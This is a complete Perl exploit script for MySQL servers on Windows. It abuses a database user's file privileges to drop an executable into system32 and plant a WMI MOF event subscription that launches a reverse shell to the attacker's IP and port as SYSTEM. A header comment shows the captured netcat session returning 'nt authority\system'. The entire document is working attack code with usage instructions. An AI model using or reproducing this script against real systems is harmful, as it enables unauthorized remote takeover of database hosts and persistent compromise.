# MySQL on Windows Remote Exploit
# Leverages file privileges to obtain a SYSTEM shell
# tested o windows server 2003
# Will retrieve the equivalent of:
#C:\Users\kingcope\Downloads\nc11nt>nc -v -l -p 5555
#listening on [any] 5555 ...
#connect to [192.168.2.150] from isowarez [192.168.2.150] 60357
#Microsoft Windows [Version 5.2.3790]
#(C) Copyright 1985-2003 Microsoft Corp.
#
#C:\WINDOWS\system32>whoami
#whoami
#nt authority\system
#
#C:\WINDOWS\system32>
#
use DBI();
use Encode;
$|=1;

if ($#ARGV != 4) {
print "MySQL on Windows Remote Exploit (requires user with 'file' privs)\n";
print "Usage: perl mysql_win_remote.pl <target> <user> <password> <yourip> <yourport>\n";
print "Example: perl mysql_win_remote.pl 192.168.2.100 root \"\" 192.168.2.150 5555\n";
exit;
}

$database = "mysql";
$host = $ARGV[0];
$user = $ARGV[1];
$password = $ARGV[2];
$ip = $ARGV[3];
$port = $ARGV[4];

$payload = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")

instance of __EventFilter as \$EventFilter
{
    EventNamespace = \"Root\\\\Cimv2\";
    Name  = \"filtP2\";
    Query = \"Select * From __InstanceModificationEvent \"
            \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"
            \"And TargetInstance.Second = 5\";
    QueryLanguage = \"WQL\";
};

instance of ActiveScriptEventConsumer as \$Consumer
{
    Name = \"consPCSV2\";
    ScriptingEngine = \"JScript\";
    ScriptText = 
    \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"event.exe $ip $port\\\")\";
};

instance of __FilterToConsumerBinding
{
    Consumer   = \$Consumer;
    Filter = \$EventFilter;
};";

my $dbh = DBI->connect("DBI:mysql:database=$database;host=$host;",
                     $user, $password,
                     {'RaiseError' => 0});

sub createblobs {
$tablename = shift;
$file = shift;
eval { $dbh->do("DROP TABLE $tablename") };
print "Dropping $tablename failed: $@\n" if $@;

$dbh->do("CREATE TABLE $tablename (data LONGBLOB)");

open FILE, "<$file";
$size = -s $file;
binmode FILE;
$len = read(FILE, $data, $size);
print $len."\n";
close FILE;

my $sql = "INSERT INTO $tablename VALUES (?)";

my $sth = $dbh->prepare($sql) or do {
    die "It didn't work. [$DBI::errstr]\n";
};
$sth->bind_param(1, $data);
$sth->execute or do {
    die "It didn't work. [$DBI::errstr]\n";
};
$sth->finish();
}

my $sth = $dbh->prepare("SELECT \@\@version_compile_os;");
$sth->execute();

while (my @row = $sth->fetchrow_array()) {
print "MySQL Version: $row[0]\n";
}
if (!$row[0] =~ /win/i) {
	print "\nThis is not a Windows MySQLD!\n";
	exit;
}
print "W00TW00T!\n";

createblobs("table1", "event.exe");

open FILE, ">nullevt.mof";
print FILE $payload;
close FILE;

createblobs("table2", "nullevt.mof");

$dbh->do("SELECT data FROM table1 INTO DUMPFILE 'c:/windows/system32/event.exe'");
$dbh->do("SELECT data FROM table2 INTO DUMPFILE 'c:/windows/system32/wbem/mof/nullevt.mof'");

$dbh->disconnect();

print "done.";